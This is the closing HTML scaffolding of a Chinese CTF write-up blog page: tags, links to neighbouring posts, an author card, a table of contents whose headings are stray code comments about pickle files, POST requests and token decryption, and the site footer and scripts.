+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">Python原型链污染</a></div><div class="post_share"><div class="social-share" data-image="/img/youli.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/01/01/ctf-kb/wp/Web/2024-%E9%A2%86%E8%88%AA%E6%9D%AF-%E9%AB%98%E8%81%8C%E7%BB%84%E5%88%9D%E8%B5%9BWP-%E4%B8%80/" title="2024&quot;领航杯&quot;-高职组初赛WP（一）"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">2024&quot;领航杯&quot;-高职组初赛WP（一）</div></div></a></div><div class="next-post pull-right"><a href="/2024/01/01/ctf-kb/wp/Web/2024%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E6%8C%91%E6%88%98%E8%B5%9B-%E5%88%9D%E8%B5%9BWrite_up/" title="2024 巅峰极客挑战赛-初赛 Write_up"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">2024 巅峰极客挑战赛-初赛 Write_up</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/youli.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">朴冬</div><div class="author-info__description">琐碎的学习记录</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">1050</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">879</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://space.bilibili.com/242470829?spm_id_from=333.1007.0.0"><i class="fab fa-bilibili"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/PUDONGGGGGG" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="/2559874620@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a><a class="social-icon" href="https://space.bilibili.com/242470829?spm_id_from=333.1007.0.0" target="_blank" title="Bilibili"><i class="fab fa-bilibili" style="color: #1797cf;"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B0%86%E5%AD%97%E8%8A%82%E6%B5%81%E5%86%99%E5%85%A5%E5%88%B0%E6%96%87%E4%BB%B6-1-pkl-%E4%B8%AD"><span class="toc-number">1.</span> <span class="toc-text">将字节流写入到文件 1.pkl 中</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%9B%AE%E6%A0%87-URL"><span class="toc-number">2.</span> <span class="toc-text">目标 URL</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84"><span class="toc-number">3.</span> <span class="toc-text">文件路径</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E5%B9%B6%E5%8F%91%E9%80%81%E8%AF%B7%E6%B1%82"><span class="toc-number">4.</span> <span class="toc-text">读取文件内容并发送请求</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%AE%BE%E7%BD%AE%E8%AF%B7%E6%B1%82%E5%A4%B4"><span class="toc-number">5.</span> <span class="toc-text">设置请求头</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%91%E9%80%81-POST-%E8%AF%B7%E6%B1%82"><span class="toc-number">6.</span> <span class="toc-text">发送 POST 请求</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%89%93%E5%8D%B0%E5%93%8D%E5%BA%94%E5%86%85%E5%AE%B9"><span class="toc-number">7.</span> <span class="toc-text">打印响应内容</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E6%96%B0%E7%9A%84TXT%E6%96%87%E4%BB%B6"><span class="toc-number">8.</span> <span class="toc-text">创建一个新的TXT文件</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%81%8D%E5%8E%86%E4%BB%8E500%E5%88%B02000%E7%9A%84%E6%AF%8F%E4%B8%AA%E6%95%B0%E5%AD%97"><span class="toc-number">9.</span> <span class="toc-text">遍历从500到2000的每个数字</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B0%86%E6%95%B0%E5%AD%97%E8%BD%AC%E6%8D%A2%E4%B8%BA%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%B9%B6%E8%AE%A1%E7%AE%97MD5%E5%93%88%E5%B8%8C%E5%80%BC"><span class="toc-number">10.</span> <span class="toc-text">将数字转换为字符串并计算MD5哈希值</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B0%86%E5%93%88%E5%B8%8C%E5%80%BC%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6%EF%BC%8C%E6%AF%8F%E4%B8%AA%E5%93%88%E5%B8%8C%E5%80%BC%E5%8D%A0%E4%B8%80%E8%A1%8C"><span class="toc-number">11.</span> <span class="toc-text">将哈希值写入文件，每个哈希值占一行</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BD%AC%E6%8D%A2%E4%B8%BAASCII%E5%AD%97%E7%AC%A6"><span class="toc-number">12.</span> <span class="toc-text">转换为ASCII字符</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B"><span class="toc-number">13.</span> <span class="toc-text">使用示例</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%89%93%E5%BC%80%E5%9B%BE%E5%83%8F"><span class="toc-number">14.</span> <span class="toc-text">打开图像</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#print-f%E2%80%9DImage-dimensions-width-x-height-%E2%80%9D"><span class="toc-number">15.</span> <span class="toc-text">print(f”Image dimensions: {width}x{height}”)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8F%90%E5%8F%96%E7%89%B9%E5%AE%9A%E5%83%8F%E7%B4%A0%E7%82%B9%E7%9A%84%E9%A2%9C%E8%89%B2%E5%80%BC"><span class="toc-number">16.</span> <span class="toc-text">提取特定像素点的颜色值</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#x-y-5-0-%E6%9B%BF%E6%8D%A2%E4%B8%BA%E4%BD%A0%E6%84%9F%E5%85%B4%E8%B6%A3%E7%9A%84%E5%83%8F%E7%B4%A0%E4%BD%8D%E7%BD%AE"><span class="toc-number">17.</span> <span class="toc-text">x, y &#x3D; 5, 0  # 替换为你感兴趣的像素位置</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pixel-value-image-getpixel-x-y"><span class="toc-number">18.</span> <span class="toc-text">pixel_value &#x3D; image.getpixel((x, y))</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#print-image-getpixel-33-2"><span class="toc-number">19.</span> <span class="toc-text">print(image.getpixel((33, 2)))</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#for-y-in-range-224"><span class="toc-number">20.</span> <span class="toc-text">for y in range(224):</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pixel-value2-image2-getpixel-x-0"><span class="toc-number">21.</span> <span class="toc-text">pixel_value2 &#x3D; image2.getpixel((x, 0))</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pixel-value2-image3-getpixel-x-0"><span class="toc-number">22.</span> <span class="toc-text">pixel_value2 &#x3D; image3.getpixel((x, 0))</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#print-f%E2%80%9DPixel-value-at-x-0-pixel-value-%E2%80%9D"><span class="toc-number">23.</span> <span class="toc-text">print(f”Pixel value at ({x}, {0}): {pixel_value}”)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#print-flag"><span class="toc-number">24.</span> <span class="toc-text">print(flag)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#url-%E2%80%9Chttp-127-0-0-1"><span class="toc-number">25.</span> <span class="toc-text">url &#x3D; “http:&#x2F;&#x2F;127.0.0.1:</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#iv-b%E2%80%9D2%E2%80%B3-16"><span class="toc-number">26.</span> <span class="toc-text">iv &#x3D; b”2″*16</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#key-b%E2%80%9D1%E2%80%B3-16"><span class="toc-number">27.</span> <span class="toc-text">key &#x3D; b”1″*16</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#initialize-globals"><span class="toc-number">28.</span> <span class="toc-text">initialize_globals()</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#token-encrypt-data-key"><span class="toc-number">29.</span> <span class="toc-text">token &#x3D; encrypt(data, key)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#if-token0-10-encrypt-%E2%80%9Cadmin%E2%80%9D-key-continue"><span class="toc-number">30.</span> <span class="toc-text">if token0[:10] !&#x3D; encrypt(“admin”, key): continue</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#print-encrypt-%E2%80%9Cadminx00%E2%80%9D-key"><span class="toc-number">31.</span> <span class="toc-text">print(encrypt(“adminx00”, key))</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#print-token"><span class="toc-number">32.</span> <span class="toc-text">print(token)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#print-ct"><span class="toc-number">33.</span> <span class="toc-text">print(ct)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#decrypted-decrypt-ct-key"><span class="toc-number">34.</span> <span class="toc-text">decrypted &#x3D; decrypt(ct, key)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#print-i-decrypted"><span class="toc-number">35.</span> <span class="toc-text">print(i, decrypted)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#token-username-token-password-decrypted-split-b%E2%80%99x00%E2%80%B2"><span class="toc-number">36.</span> <span class="toc-text">token_username, *_, token_password &#x3D; decrypted.split(b’x00′)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#token-password-token-password-3"><span class="toc-number">37.</span> <span class="toc-text">token_password &#x3D; token_password[:-3]</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#print-hex-i-2-zfill-2-token-username-token-password"><span class="toc-number">38.</span> <span class="toc-text">print(hex(i)[2:].zfill(2), token_username, _, token_password)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#if-token-username-b%E2%80%9Dadmin%E2%80%9D"><span class="toc-number">39.</span> <span class="toc-text">if token_username &#x3D;&#x3D; b”admin”</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#input"><span class="toc-number">40.</span> <span class="toc-text">input()</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#decrypted-decrypt-ct-key-1"><span class="toc-number">41.</span> <span class="toc-text">decrypted &#x3D; decrypt(ct, key)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#print-decrypted-split-b%E2%80%99x00%E2%80%B2"><span class="toc-number">42.</span> <span class="toc-text">print(decrypted.split(b’x00′))</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#token-username-token-password-decrypted-split-b%E2%80%99x00%E2%80%B2-1"><span class="toc-number">43.</span> <span class="toc-text">token_username, *_, token_password &#x3D; decrypted.split(b’x00′)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#token-password-token-password-3-1"><span class="toc-number">44.</span> <span class="toc-text">token_password &#x3D; token_password[:-3]</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#print-hex-i-2-zfill-2-token-username-token-password-1"><span class="toc-number">45.</span> <span class="toc-text">print(hex(i)[2:].zfill(2), token_username, _, token_password)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#if-username-token-username-and-password-token-password"><span class="toc-number">46.</span> <span class="toc-text">if username &#x3D;&#x3D; token_username and password &#x3D;&#x3D; token_password:</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#if-token-password-b%E2%80%99123456%E2%80%B2"><span class="toc-number">47.</span> <span class="toc-text">if token_password &#x3D;&#x3D; b’123456′:</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#print-token-password"><span class="toc-number">48.</span> <span class="toc-text">print(token_password)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%84%E5%9B%BE"><span class="toc-number">48.1.</span> <span class="toc-text">附图</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/Dirsearch/" title="Dirsearch">Dirsearch</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/SCRIPTS-INDEX/" title="CTF 常用脚本索引">CTF 常用脚本索引</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/ffuf%E7%9A%84%E4%BD%BF%E7%94%A8/" title="ffuf的使用">ffuf的使用</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2026 By 朴冬</div><div class="footer_custom_text">Welcome</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat-btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="/js/tw_cn.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>
